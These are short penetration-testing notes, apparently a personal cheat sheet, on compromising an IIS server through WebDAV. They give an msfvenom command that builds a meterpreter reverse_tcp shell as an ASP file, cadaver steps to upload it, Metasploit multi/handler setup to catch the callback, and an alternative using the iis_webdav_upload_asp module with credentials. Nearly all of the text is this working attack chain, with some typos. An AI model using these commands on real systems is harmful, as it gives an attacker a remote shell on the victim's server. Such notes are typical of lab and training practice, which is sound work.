nmap --script=http-enum

mafvenom will creat our reverse shell :
we will choose our : 
- our payload
- our local host 
- our local port that will listen on
- our type of file depends on what a target accept for eample IIS is asp 

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

cadaver we can upload our shell: 
cadaver http://IP/webdav
put shell 

we need to start listener using Metasploit:

- service postgresql start
- Metasploit -> use /multi/handler
- set payload  /reverse_tcp
- add other information ip/port

meterpreter commands 
sysinfo 
getuid

another way:

search iis upload iis/iis_webdav_upload_asp 
add username
add password
set path /webdav/meta.asp 
set Local IP/PORT 


